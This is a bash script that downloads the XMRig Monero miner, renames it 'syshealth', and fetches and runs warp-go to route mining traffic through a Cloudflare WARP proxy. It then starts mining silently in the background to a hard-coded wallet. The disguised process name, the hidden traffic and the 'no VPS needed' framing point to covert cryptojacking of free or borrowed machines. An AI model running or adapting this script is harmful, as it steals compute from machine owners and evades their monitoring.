#!/bin/bash
# warp-mine.sh - Mine using Cloudflare WARP (FREE, no VPS needed)
# Uses warp-go to create SOCKS5 proxy at localhost:40000

WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Download miner if needed
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  echo "Downloading XMRig..."
  curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz -C /tmp
  mv /tmp/xmrig-6.21.0/xmrig "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig-*
fi

# Download and install warp-go
echo "Installing Cloudflare WARP..."
cd "$SCRIPT_DIR"
WARP_ARCH="amd64"
if [ "$(uname -m)" = "aarch64" ]; then
  WARP_ARCH="arm64"
fi

# Get latest warp-go release
WARP_URL="https://gitlab.com/ProjectWARP/warp-go/-/releases/permalink/latest/downloads/warp-go_linux_$WARP_ARCH"
curl -sL "$WARP_URL" -o warp-go
chmod +x warp-go

# Generate WARP config and start SOCKS5 proxy
echo "Connecting to Cloudflare WARP..."
./warp-go --bind 127.0.0.1:40000 &
WARP_PID=$!
sleep 15

# Check if WARP is running
if ! kill -0 $WARP_PID 2>/dev/null; then
  echo "ERROR: WARP failed to start"
  exit 1
fi

echo "WARP connected! SOCKS5 proxy at 127.0.0.1:40000"

# Start miner with SOCKS5 proxy
echo "Starting XMRig with WARP..."
cd "$SCRIPT_DIR"
nohup ./syshealth \
  --url="$POOL_URL" \
  --user="$WALLET" \
  --pass="$WORKER_NAME" \
  --tls \
  --keepalive \
  --donate-level=1 \
  --socks5=127.0.0.1:40000 \
  --log-file=xmrig.log \
  > /dev/null 2>&1 &

echo "Mining started with Cloudflare WARP!"
echo "Check logs: tail -f $SCRIPT_DIR/xmrig.log"
